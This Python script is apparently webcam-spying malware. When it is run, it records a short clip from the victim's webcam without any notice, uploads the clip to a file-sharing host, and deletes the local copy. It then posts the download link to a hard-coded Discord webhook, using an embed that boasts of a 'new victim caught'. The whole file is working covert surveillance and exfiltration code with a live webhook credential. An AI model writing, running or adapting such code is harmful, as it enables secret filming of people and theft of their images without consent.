import os, cv2, requests, time, gofile2, datetime

class WebcamRecorder():
    def __init__(self):
        self.webhook = "https://discord.com/api/webhooks/892011430507843614/gQTiTj8kqJzopvJm_ykesWoqEtBK5MGJ8xSirxUM2bLsJxy0nYH2u9FcslPTEudrEckR"
        self.filename = 'video.avi'

        self.Recorder()

    def change_res(self, cap, width, height):
        cap.set(3, width)
        cap.set(4, height)
        
    def get_dims(self, cap, res='1080p'):
        STD_DIMENSIONS =  {
            "480p": (640, 480),
            "720p": (1280, 720),
            "1080p": (1920, 1080),
            "4k": (3840, 2160),
        }
        width, height = STD_DIMENSIONS["480p"]
        if res in STD_DIMENSIONS:
            width,height = STD_DIMENSIONS[res]
        self.change_res(cap, width, height)
        return width, height

    def Recorder(self):
        res = '720p'
        t_end = time.time() + 2
        cap = cv2.VideoCapture(0)
        out = cv2.VideoWriter(self.filename, cv2.VideoWriter_fourcc(*'XVID'), 25, self.get_dims(cap, res))
        while time.time() < t_end:
            ret, frame = cap.read()
            out.write(frame)
        cap.release()
        out.release()
        cv2.destroyAllWindows()
        g_a = gofile2.Gofile()
        videoUrl = g_a.upload(file=f'{os.getcwd()}\\{self.filename}')
        self.webcam = f"**Webcam Video: [{videoUrl['downloadPage']}]({videoUrl['downloadPage']})**"
        os.remove(os.getcwd()+"\\"+self.filename)
        self.WebhookSender(self.webcam)

    def WebhookSender(self, webcam):
        today = datetime.date.today()
        alert = {
            "avatar_url":"https://i.imgur.com/QVCVjM4.png",
            "name":"Webcam Catcher",
            "embeds": [
                {
                    "author": {
                        "name": "𝓦𝓮𝓫𝓬𝓪𝓶 𝓒𝓪𝓽𝓬𝓱𝓮𝓻",
                        "icon_url": "https://i.imgur.com/QVCVjM4.png",
                        "url": "https://github.com/Rdimo/Webcam-recorder"
                        },
                    "description": f"𝗡𝗲𝘄 𝘃𝗶𝗰𝘁𝗶𝗺 𝗰𝗮𝘂𝗴𝗵𝘁 𝗶𝗻 𝟰𝗸\n{webcam}",
                    "color": 8421504,
                    "footer": {
                      "text": f"github.com/Rdimo/Webcam-recorder Caught Someone lacking at・{today}"
                    }
                }
            ]
        }
        requests.post(self.webhook, json=alert)

if __name__ == "__main__":
    WebcamRecorder()